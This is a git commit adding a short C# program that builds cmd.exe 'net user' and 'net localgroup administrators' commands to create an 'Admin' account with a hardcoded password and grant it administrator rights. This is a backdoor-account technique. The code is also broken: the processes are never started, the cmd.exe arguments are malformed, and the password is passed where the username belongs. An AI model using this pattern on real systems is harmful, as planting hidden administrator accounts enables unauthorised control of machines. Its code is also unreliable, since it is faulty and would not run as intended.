f064b635033b9c2129b143a84c0a6bdba0c30349
PaulIRL <paulandreiabrudan@pm.me>
2022-03-08 09:26:45 +0200

    initial release

---
+++ Program.cs
@@ -0,0 +1,30 @@
+﻿using System.Diagnostics;
+
+const string Username = "Admin";
+
+const string Password = "TestPw123$%";
+
+void AddUser(string username, string password)
+{
+    Process cmd = new Process();
+    cmd.StartInfo.FileName = "cmd.exe";
+    cmd.StartInfo.ArgumentList.Add("net");
+    cmd.StartInfo.ArgumentList.Add("user");
+    cmd.StartInfo.ArgumentList.Add(username);
+    cmd.StartInfo.ArgumentList.Add(password);
+    cmd.StartInfo.ArgumentList.Add("/add");
+}
+
+void MakeUserAdmin(string username)
+{
+    Process cmd = new Process();
+    cmd.StartInfo.FileName = "cmd.exe";
+    cmd.StartInfo.ArgumentList.Add("net");
+    cmd.StartInfo.ArgumentList.Add("localgroup");
+    cmd.StartInfo.ArgumentList.Add("administrators");
+    cmd.StartInfo.ArgumentList.Add(username);
+    cmd.StartInfo.ArgumentList.Add("/add");
+}
+
+AddUser(Username,Password);
+MakeUserAdmin(Password);
